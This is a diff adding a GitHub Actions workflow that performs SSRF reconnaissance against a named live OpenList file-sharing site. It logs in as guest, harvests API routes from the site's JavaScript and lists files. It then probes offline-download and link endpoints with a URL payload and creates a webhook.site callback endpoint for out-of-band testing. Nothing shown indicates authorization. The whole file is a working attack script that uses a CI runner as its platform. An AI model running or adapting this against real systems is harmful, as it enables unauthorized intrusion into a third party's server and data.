@@ -1,0 +1,43 @@
+name: openlist-ssrf-recon
+on:
+  workflow_dispatch:
+jobs:
+  recon:
+    runs-on: ubuntu-latest
+    steps:
+      - name: OpenList SSRF recon (guest token, server-side fetch surface enum)
+        run: |
+          set +e
+          B="https://pan.yazinb.icu"
+          echo "=== [1] login guest ==="
+          LOGIN=$(curl -skS -m 20 -X POST "$B/api/auth/login" -H "Content-Type: application/json" -d '{"username":"guest","password":"guest"}')
+          TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('token',''))" 2>/dev/null)
+          echo "token_len=${#TOKEN}"
+          AUTH="Authorization: ${TOKEN}"
+          echo "=== [2] frontend HTML + JS route harvest ==="
+          HTML=$(curl -skS -m 20 "$B/")
+          echo "$HTML" | grep -oE '/assets/[^"]+\.js' | sort -u > /tmp/jslist.txt
+          cat /tmp/jslist.txt
+          : > /tmp/routes.txt
+          while read -r j; do
+            [ -z "$j" ] && continue
+            echo "--- routes in $j ---"
+            curl -skS -m 30 "$B$j" | grep -oE '"/api/[a-zA-Z0-9_/{}$.:,-]+' | sed 's/"//g' | sort -u >> /tmp/routes.txt
+          done < /tmp/jslist.txt
+          echo "=== UNIQUE /api ROUTES (top 120) ==="
+          sort -u /tmp/routes.txt | head -120
+          echo "=== [3] guest fs/list on / ==="
+          curl -skS -m 20 -X POST "$B/api/fs/list" -H "$AUTH" -H "Content-Type: application/json" -d '{"path":"/","page":1,"per_page":20,"refresh":false}' -w "\nHTTP %{http_code}\n" | head -c 1500
+          echo
+          echo "=== [4] guest settings /me ==="
+          curl -skS -m 20 "$B/api/me" -H "$AUTH" -w "\nHTTP %{http_code}\n" | head -c 800
+          echo
+          echo "=== [5] probe plausible server-fetch endpoints (guest) ==="
+          for ep in "/api/fs/other" "/api/fs/get" "/api/fs/link" "/api/storage/list" "/api/task/aria2/add" "/api/task/offline_download/add" "/api/fs/add_offline_download" "/api/public/link"; do
+            CODE=$(curl -skS -m 15 -o /tmp/p.txt -w "%{http_code}" -X POST "$B$ep" -H "$AUTH" -H "Content-Type: application/json" -d '{"path":"/","url":"http://example.com/","method":"offline_download"}' 2>/dev/null)
+            echo "GUEST $ep -> HTTP $CODE | $(head -c 200 /tmp/p.txt | tr -d '\n')"
+          done
+          echo "=== [6] runner OAST reachability (webhook.site) ==="
+          curl -skS -m 15 -X POST "https://webhook.site/api/create" -H "Content-Type: application/json" -d '{}' -w "\nHTTP %{http_code}\n" | head -c 400
+          echo
+          echo "=== RECON DONE ==="
